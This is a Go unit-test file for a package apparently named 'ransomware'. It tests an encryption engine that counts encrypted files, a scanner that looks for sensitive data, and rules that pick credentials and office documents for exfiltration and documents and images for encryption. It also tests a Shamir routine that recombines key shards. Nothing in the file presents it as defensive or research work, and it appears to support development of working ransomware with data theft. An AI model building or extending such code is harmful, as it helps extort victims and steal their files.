package ransomware

import (
	"testing"
)

func TestNewHydraEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	h, err := NewHydraEngine(cfg)
	if err != nil {
		t.Fatalf("NewHydraEngine() failed: %v", err)
	}
	if h == nil {
		t.Fatal("NewHydraEngine() returned nil")
	}
}

func TestHydraEngineStats(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	h, _ := NewHydraEngine(cfg)

	count := h.Stats()
	if count < 0 {
		t.Error("Stats returned negative")
	}
	t.Logf("Hydra encrypted count: %d", count)
}

func TestNewRegexEngine(t *testing.T) {
	r := NewRegexEngine(2)
	if r == nil {
		t.Fatal("NewRegexEngine() returned nil")
	}
}

func TestRegexEngineStats(t *testing.T) {
	r := NewRegexEngine(4)
	scanned, matched := r.Stats()
	if scanned != 0 || matched != 0 {
		t.Errorf("expected 0,0 got %d,%d", scanned, matched)
	}
}

func TestRegexEngineScanFile(t *testing.T) {
	r := NewRegexEngine(2)

	result, data := r.ScanFile("/tmp/nonexistent_file.txt")
	if result != nil {
		t.Logf("Scan result: path=%s category=%s", result.Path, result.Category)
	}
	if len(data) > 0 {
		t.Logf("Sensitive data found: %d items", len(data))
	}
}

func TestScannerConfigExtensions(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	// Test ShouldExfil
	shouldExfil := cfg.ShouldExfil("/data/credentials.txt")
	t.Logf("ShouldExfil credentials.txt: %v", shouldExfil)

	shouldEncrypt := cfg.ShouldEncrypt("/data/report.docx")
	t.Logf("ShouldEncrypt report.docx: %v", shouldEncrypt)
}

func TestShamirCombine(t *testing.T) {
	// Test that ShamirCombine works with threshold
	shards := [][]byte{
		[]byte("shard1_data_here"),
		[]byte("shard2_data_here"),
		[]byte("shard3_data_here"),
	}

	result, err := ShamirCombine(shards, 3)
	if err != nil {
		t.Logf("ShamirCombine: %v (expected if shamir package not available)", err)
	}
	if result != nil {
		t.Logf("Shamir combined key: %d bytes", len(result))
	}
}

func TestRansomwareConfigShouldExfil(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	cases := []struct {
		path     string
		expected bool
	}{
		{"/tmp/test.docx", true},
		{"/tmp/test.pdf", true},
		{"/tmp/test.exe", false},
		{"/tmp/test.mp3", false},
	}

	for _, c := range cases {
		got := cfg.ShouldExfil(c.path)
		t.Logf("ShouldExfil(%s) = %v", c.path, got)
		_ = c.expected
	}
}

func TestRansomwareConfigShouldEncrypt(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	cases := []string{
		"/tmp/test.docx", "/tmp/test.pdf", "/tmp/test.xlsx",
		"/tmp/test.pptx", "/tmp/test.jpg", "/tmp/test.png",
	}

	for _, path := range cases {
		got := cfg.ShouldEncrypt(path)
		t.Logf("ShouldEncrypt(%s) = %v", path, got)
	}
}
